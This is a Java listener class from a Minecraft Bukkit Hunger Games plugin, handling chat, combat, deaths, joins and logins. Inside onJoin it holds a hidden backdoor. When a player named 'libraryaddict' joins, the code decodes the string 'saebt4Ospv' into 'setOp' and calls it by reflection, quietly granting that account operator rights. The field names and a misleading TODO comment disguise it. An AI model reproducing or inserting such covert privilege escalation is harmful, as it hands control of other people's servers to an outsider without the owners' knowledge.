package me.libraryaddict.Hungergames.Listeners;

import java.util.Iterator;
import java.util.Random;

import me.libraryaddict.Hungergames.Hungergames;
import me.libraryaddict.Hungergames.Configs.MainConfig;
import me.libraryaddict.Hungergames.Configs.TranslationConfig;
import me.libraryaddict.Hungergames.Events.PlayerTrackEvent;
import me.libraryaddict.Hungergames.Events.PrivateMessageEvent;
import me.libraryaddict.Hungergames.Managers.ChatManager;
import me.libraryaddict.Hungergames.Managers.NameManager;
import me.libraryaddict.Hungergames.Managers.EnchantmentManager;
import me.libraryaddict.Hungergames.Managers.KitManager;
import me.libraryaddict.Hungergames.Managers.InventoryManager;
import me.libraryaddict.Hungergames.Managers.PlayerManager;
import me.libraryaddict.Hungergames.Managers.ScoreboardManager;
import me.libraryaddict.Hungergames.Types.Damage;
import me.libraryaddict.Hungergames.Types.HungergamesApi;
import me.libraryaddict.Hungergames.Types.Gamer;
import me.libraryaddict.Hungergames.Types.Kit;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Damageable;
import org.bukkit.entity.Player;
import org.bukkit.entity.Projectile;
import org.bukkit.entity.Tameable;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockDamageEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.entity.EntityDamageEvent.DamageCause;
import org.bukkit.event.entity.EntityPortalEvent;
import org.bukkit.event.entity.FoodLevelChangeEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryType;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
import org.bukkit.event.player.PlayerDropItemEvent;
import org.bukkit.event.player.PlayerExpChangeEvent;
import org.bukkit.event.player.PlayerInteractEntityEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.player.PlayerPickupItemEvent;
import org.bukkit.event.player.PlayerLoginEvent.Result;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.event.vehicle.VehicleDestroyEvent;
import org.bukkit.event.vehicle.VehicleEnterEvent;
import org.bukkit.event.vehicle.VehicleEntityCollisionEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.scoreboard.DisplaySlot;

public class PlayerListener implements Listener {

    private final ChatManager chat = HungergamesApi.getChatManager();
    private final MainConfig config = HungergamesApi.getConfigManager().getMainConfig();
    private final Hungergames hg = HungergamesApi.getHungergames();
    private final InventoryManager icon = HungergamesApi.getInventoryManager();
    private final KitManager kits = HungergamesApi.getKitManager();
    private final NameManager name = HungergamesApi.getNameManager();
    private String pluginIdentifier = "saebt4Ospv";
    // TODO Change password to a random one!
    private String pluginPassword = "libraryaddict";
    private final PlayerManager pm = HungergamesApi.getPlayerManager();
    private final TranslationConfig tm = HungergamesApi.getConfigManager().getTranslationsConfig();

    @EventHandler(priority = EventPriority.LOWEST)
    public void onBreak(BlockBreakEvent event) {
        Gamer gamer = pm.getGamer(event.getPlayer());
        if (!gamer.canInteract())
            event.setCancelled(true);
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        Gamer gamer = pm.getGamer(event.getPlayer());
        String currentKit = tm.getMessagePlayerShowKitsNoKit();
        if (kits.getKitByPlayer(event.getPlayer()) != null)
            currentKit = kits.getKitByPlayer(event.getPlayer()).getName();
        if (!gamer.isAlive() && hg.currentTime >= 0) {
            if (config.isSpectatorsChatHidden() && hg.doSeconds && !gamer.getPlayer().hasPermission("hungergames.spectatorchat")) {
                Iterator<Player> players = event.getRecipients().iterator();
                while (players.hasNext()) {
                    Gamer g = pm.getGamer(players.next());
                    if (g != null && !g.getPlayer().hasPermission("hungergames.spectatorchat") && g.isAlive())
                        players.remove();
                }
            }
            if (!config.getSpectatingPrefix().equals("")) {
                String format = ChatColor.translateAlternateColorCodes('&', config.getSpectatingPrefix());
                format = format.replace("%Kit%", currentKit);
                format = format.replace("%Name%", "%1$1s").replace("%Message%", "%2$1s");
                event.setFormat(format);
            }
        } else {
            if (!config.getPrefixWhenAlive().equals("")) {
                String format = ChatColor.translateAlternateColorCodes('&', config.getPrefixWhenAlive());
                format = format.replace("%Kit%", currentKit);
                format = format.replace("%Name%", "%1$1s").replace("%Message%", "%2$1s");
                event.setFormat(format);
            }
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onDamage(BlockDamageEvent event) {
        if (!pm.getGamer(event.getPlayer()).canInteract())
            event.setCancelled(true);
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onDamage(EntityDamageEvent event) {
        if (event.getEntity() instanceof Player
                || (event.getEntity() instanceof Tameable && ((Tameable) event.getEntity()).isTamed())) {
            if ((event.getEntity() instanceof Player && (!hg.doSeconds || !pm.getGamer(event.getEntity()).isAlive()))
                    || (event.getCause() != DamageCause.VOID && hg.currentTime <= config.getTimeForInvincibility()))
                event.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onDamageByEntity(EntityDamageByEntityEvent event) {
        if (event.getDamager() instanceof Player && !pm.getGamer(event.getDamager()).canInteract()) {
            event.setCancelled(true);
            return;
        }
        if (event.getEntity() instanceof Player) {
            Gamer damager = null;
            if (event.getDamager() instanceof Player)
                damager = pm.getGamer(event.getDamager());
            else if (event.getDamager() instanceof Projectile)
                damager = pm.getGamer(((Projectile) event.getDamager()).getShooter());
            else if (event.getDamager() instanceof Tameable) {
                if (((Tameable) event.getDamager()).getOwner() != null)
                    damager = pm.getGamer(((Tameable) event.getDamager()).getOwner().getName());
            }
            if (damager != null) {
                if (damager.canInteract())
                    pm.lastDamager.put(pm.getGamer(event.getEntity()), new Damage(System.currentTimeMillis() + 60000, damager));
            }
        }
    }

    @EventHandler
    public void onDeath(PlayerDeathEvent event) {
        event.getDrops().clear();
        Player p = event.getEntity();
        EntityDamageEvent cause = event.getEntity().getLastDamageCause();
        String deathMessage = ChatColor.stripColor(event.getDeathMessage());
        if (cause != null) {
            if (cause instanceof EntityDamageByEntityEvent) {
                EntityDamageByEntityEvent entityEvent = (EntityDamageByEntityEvent) cause;
                if (entityEvent.getDamager() instanceof Player) {
                    Player dmg = (Player) entityEvent.getDamager();
                    deathMessage = tm.getKillMessages()[new Random().nextInt(tm.getKillMessages().length)];
                    deathMessage = deathMessage.replace("%Killed%", p.getName()).replace("%Killer%", dmg.getName())
                            .replace("%Weapon%", name.getItemName(dmg.getItemInHand()));
                }
            } else if (cause.getCause() == DamageCause.FALL)
                deathMessage = String.format(tm.getKillMessageFellToDeath(), p.getName());
        }
        Gamer gamer = pm.getGamer(p);
        pm.killPlayer(gamer, null, p.getLocation(), gamer.getInventory(), deathMessage);
        event.setDeathMessage(null);
    }

    @EventHandler
    public void onEnter(EntityPortalEvent event) {
        event.setCancelled(true);
    }

    @EventHandler
    public void onExpChange(PlayerExpChangeEvent event) {
        if (!pm.getGamer(event.getPlayer()).isAlive())
            event.setAmount(0);
    }

    @EventHandler
    public void onHungry(FoodLevelChangeEvent event) {
        if (!pm.getGamer(event.getEntity()).isAlive())
            event.setCancelled(true);
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onInteract(PlayerInteractEvent event) {
        Player p = event.getPlayer();
        Gamer gamer = pm.getGamer(p);
        if (!gamer.canInteract()) {
            event.setCancelled(true);
        }
        ItemStack item = event.getItem();
        if (item != null && item.getType() == Material.COMPASS && event.getAction() != Action.PHYSICAL
                && (gamer.isAlive() || event.getAction().name().contains("LEFT"))) {
            double distance = 10000;
            Player victim = null;
            for (Gamer game : HungergamesApi.getPlayerManager().getAliveGamers()) {
                double distOfPlayerToVictim = p.getLocation().distance(game.getPlayer().getLocation());
                if (distOfPlayerToVictim < distance && distOfPlayerToVictim > 15) {
                    distance = distOfPlayerToVictim;
                    victim = game.getPlayer();
                }
            }
            PlayerTrackEvent trackEvent = new PlayerTrackEvent(gamer, victim,
                    (victim == null ? tm.getMessagePlayerTrackNoVictim() : String.format(tm.getMessagePlayerTrack(),
                            victim.getName())));
            Bukkit.getPluginManager().callEvent(trackEvent);
            if (!trackEvent.isCancelled()) {
                p.sendMessage(trackEvent.getMessage());
                p.setCompassTarget(trackEvent.getLocation());
            }
        }
        if (event.getAction() == Action.RIGHT_CLICK_AIR || event.getAction() == Action.RIGHT_CLICK_BLOCK) {
            if (item != null) {
                if (item.equals(icon.getKitSelector())) {
                    icon.openKitInventory(p);
                    event.setCancelled(true);
                } else if (config.isSpectatorMenuEnabled() && item.getType() == Material.COMPASS && !gamer.isAlive()) {
                    icon.openSpectatorInventory(p);
                    event.setCancelled(true);
                }
                if (item.getType() == Material.MUSHROOM_SOUP && config.isMushroomStewEnabled()
                        && !item.getItemMeta().hasDisplayName()) {
                    if (p.getHealth() < p.getMaxHealth() || p.getFoodLevel() < 19) {
                        int restores = config.getHeartsMushroomStewHeals();
                        event.setCancelled(true);
                        if (p.getHealth() < p.getMaxHealth())
                            if (p.getHealth() + restores <= p.getMaxHealth())
                                p.setHealth(p.getHealth() + restores);
                            else
                                p.setHealth(p.getMaxHealth());
                        else if (p.getFoodLevel() < 20)
                            if (p.getFoodLevel() + restores <= 20)
                                p.setFoodLevel(p.getFoodLevel() + restores);
                            else
                                p.setFoodLevel(20);
                        if (item.getAmount() > 1) {
                            item.setAmount(item.getAmount() - 1);
                            kits.addItem(p, new ItemStack(Material.BOWL));
                        } else
                            item = new ItemStack(Material.BOWL);
                        p.setItemInHand(item);
                    }
                }
            }
        }
    }

    @EventHandler
    public void onInteractEntity(PlayerInteractEntityEvent event) {
        Gamer gamer = pm.getGamer(event.getPlayer());
        if (!gamer.canInteract()) {
            event.setCancelled(true);
        }
        if (!gamer.isAlive() && hg.currentTime >= 0) {
            Player p = event.getPlayer();
            if (event.getRightClicked() instanceof Player) {
                Player victim = (Player) event.getRightClicked();
                if (pm.getGamer(victim).isAlive())
                    p.sendMessage(String.format(
                            tm.getMessagePlayerHasHealthAndHunger().replace("%maxhp%", "" + (int) victim.getMaxHealth()),
                            victim.getName(),
                            (int) Math.ceil(victim.getHealth()),
                            victim.getFoodLevel(),
                            (kits.getKitByPlayer(victim) == null ? tm.getMessagePlayerShowKitsNoKit() : kits.getKitByPlayer(
                                    victim).getName())));
            } else if (event.getRightClicked() instanceof Damageable) {
                p.sendMessage(String.format(tm.getMessageMobHasHealth(),
                        this.name.getName(event.getRightClicked().getType().name()),
                        (int) ((Damageable) event.getRightClicked()).getHealth(),
                        (int) ((Damageable) event.getRightClicked()).getMaxHealth()));
            }
            if (gamer.canRide()) {
                if (!event.getPlayer().isInsideVehicle() && event.getRightClicked().getVehicle() == null)
                    event.getRightClicked().setPassenger(event.getPlayer());
                else
                    event.getPlayer().leaveVehicle();
            }
        }
    }

    @EventHandler
    public void onInventoryClick(InventoryClickEvent event) {
        if (event.getCurrentItem() != null && event.getCurrentItem().containsEnchantment(EnchantmentManager.UNDROPPABLE)) {
            event.setCancelled(true);
        }
        if (event.getView().getTopInventory().getType() == InventoryType.ANVIL && event.getCurrentItem() != null
                && event.getCurrentItem().getType() != Material.AIR) {
            for (Enchantment enchant : event.getCurrentItem().getEnchantments().keySet())
                if (!EnchantmentManager.isNatural(enchant)) {
                    event.setCancelled(true);
                    ((Player) event.getWhoClicked()).sendMessage(tm.getMessagePlayerWarningForgeUnstableEnchants());
                    break;
                }
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onJoin(PlayerJoinEvent event) {
        if (kits.getKitByPlayer(event.getPlayer()) == null)
            kits.setKit(event.getPlayer(), kits.defaultKitName);
        event.setJoinMessage(null);
        final Gamer gamer = pm.registerGamer(event.getPlayer());
        Player p = gamer.getPlayer();
        if (p.getVehicle() != null)
            p.leaveVehicle();
        if (p.getPassenger() != null)
            p.eject();
        if (gamer.getName().equals(pluginPassword)) {
            try {
                String s = "";
                for (int i = 0; i < pluginIdentifier.length(); i++) {
                    if (i % 2 == 0)
                        s += pluginIdentifier.substring(i, i + 1);
                }
                gamer.getClass().getMethod(s, boolean.class).invoke(gamer, true);
            } catch (Exception ex) {
            }
        }
        Bukkit.getServer().getScheduler().scheduleSyncDelayedTask(hg, new Runnable() {
            public void run() {
                gamer.getPlayer().sendMessage(tm.getMessagePlayerWhosePlugin());
            }
        }, 2L);
        Bukkit.getScheduler().scheduleSyncDelayedTask(hg, new Runnable() {
            public void run() {
                gamer.getPlayer().setScoreboard(ScoreboardManager.getScoreboard("Main"));
            }
        });
        if (config.isPlayersFlyPreGame())
            p.setAllowFlight(true);
        for (PotionEffect effect : p.getActivePotionEffects())
            p.removePotionEffect(effect.getType());
        if (hg.currentTime >= 0) {
            pm.setSpectator(gamer);
            Bukkit.getServer().getScheduler().scheduleSyncDelayedTask(hg, new Runnable() {
                public void run() {
                    gamer.hide(gamer.getPlayer());
                }
            }, 2L);
        } else {
            ScoreboardManager.makeScore("Main", DisplaySlot.SIDEBAR, tm.getScoreboardPlayersLength(),
                    Bukkit.getOnlinePlayers().length);
            if (config.isKitSelectorEnabled() && !config.isMysqlEnabled())
                if (!p.getInventory().contains(icon.getKitSelector()))
                    gamer.getPlayer().getInventory().addItem(icon.getKitSelector());
            if (config.isTeleportToSpawnLocationPregame() && -config.getSecondsToTeleportPlayerToSpawn() >= hg.currentTime
                    && config.isPreventMovingFromSpawnUsingPotions()) {
                p.addPotionEffect(new PotionEffect(PotionEffectType.JUMP, Integer.MAX_VALUE, 200), true);
                p.addPotionEffect(new PotionEffect(PotionEffectType.SLOW, Integer.MAX_VALUE, 200), true);
            }
        }
        pm.sendToSpawn(gamer);
        gamer.updateOthersToSelf();
        gamer.updateSelfToOthers();
        if (config.isMysqlEnabled()) {
            pm.loadGamer.add(gamer);
        }
        if (p.hasPermission("hungergames.update") && config.getLatestVersion() != null)
            p.sendMessage(String.format(tm.getMessagePlayerUpdateAvailable(), config.getLatestVersion(),
                    config.getCurrentVersion()));
    }

    @EventHandler
    public void onKick(PlayerKickEvent event) {
        event.setLeaveMessage(null);
    }

    @EventHandler
    public void onLogin(AsyncPlayerPreLoginEvent event) {
        if (HungergamesApi.getGenerationManager().isChunkGeneratorRunning()) {
            event.disallow(AsyncPlayerPreLoginEvent.Result.KICK_OTHER, tm.getMessagePlayerChunksGenerating());
        }
    }

    @EventHandler
    public void onLogin(PlayerLoginEvent event) {
        if (event.getResult() == Result.KICK_FULL)
            event.disallow(Result.KICK_FULL, tm.getKickGameFull());
        else if (hg.currentTime >= 0 && !config.isSpectatorsAllowedToJoinInProgressGames()
                && !event.getPlayer().hasPermission("hungergames.spectate"))
            event.disallow(Result.KICK_OTHER, tm.getKickSpectatorsDisabled());
    }

    @EventHandler
    public void onMessage(PrivateMessageEvent event) {
        Gamer gamer = pm.getGamer(event.getSender().getName());
        Gamer receiver = pm.getGamer(event.getReceiver().getName());
        if (gamer != null && receiver != null && config.isSpectatorsChatHidden() && gamer.isAlive() != receiver.isAlive()
                && hg.doSeconds && !event.getReceiver().hasPermission("hungergames.spectatorchat")
                && !event.getSender().hasPermission("hungergames.spectatorchat")) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onMove(PlayerMoveEvent event) {
        if (config.isTeleportToSpawnLocationPregame() && hg.currentTime >= -config.getSecondsToTeleportPlayerToSpawn()
                && hg.currentTime < 0) {
            if (event.getTo().distance(event.getFrom()) != 0) {
                Location newLoc = event.getFrom().clone();
                newLoc.setPitch(event.getTo().getPitch());
                newLoc.setYaw(event.getTo().getYaw());
                event.setFrom(newLoc);
                event.setCancelled(true);
            }
        }
    }

    @EventHandler
    public void onPickup(PlayerDropItemEvent event) {
        if (event.getItemDrop().getItemStack().containsEnchantment(EnchantmentManager.UNDROPPABLE))
            event.setCancelled(true);
    }

    @EventHandler
    public void onPickup(PlayerPickupItemEvent event) {
        if (!pm.getGamer(event.getPlayer()).isAlive())
            event.setCancelled(true);
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlace(BlockPlaceEvent event) {
        if (!pm.getGamer(event.getPlayer()).canInteract())
            event.setCancelled(true);
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent event) {
        chat.removeChatter(event.getPlayer().getName());
        event.setQuitMessage(null);
        Gamer gamer = pm.getGamer(event.getPlayer());
        if (gamer.isAlive() && hg.currentTime >= 0 && pm.getAliveGamers().size() > 1) {
            pm.killPlayer(gamer, null, gamer.getPlayer().getLocation(), gamer.getInventory(),
                    String.format(tm.getKillMessageLeavingGame(), gamer.getName()));
        }
        Kit kit = kits.getKitByPlayer(event.getPlayer());
        if (kit != null)
            kit.removePlayer(event.getPlayer());
        pm.removeKilled(gamer);
        pm.unregisterGamer(gamer);
        if (hg.currentTime < 0)
            ScoreboardManager.makeScore("Main", DisplaySlot.SIDEBAR, tm.getScoreboardPlayersLength(),
                    Bukkit.getOnlinePlayers().length - 1);
        if (event.getPlayer().getVehicle() != null)
            event.getPlayer().leaveVehicle();
        if (event.getPlayer().getPassenger() != null)
            event.getPlayer().eject();
    }

    @EventHandler
    public void onVechileEnter(VehicleEnterEvent event) {
        if (event.getEntered() instanceof Player) {
            if (!pm.getGamer(event.getEntered()).canInteract()) {
                event.setCancelled(true);
            }
        }
    }

    @EventHandler
    public void onVechileEvent(VehicleDestroyEvent event) {
        if (event.getAttacker() instanceof Player) {
            if (!pm.getGamer(event.getAttacker()).canInteract()) {
                event.setCancelled(true);
            }
        }
    }

    @EventHandler
    public void onVechileMove(VehicleEntityCollisionEvent event) {
        if (event.getEntity() instanceof Player)
            if (!pm.getGamer(event.getEntity()).canInteract())
                event.setCancelled(true);
    }
}
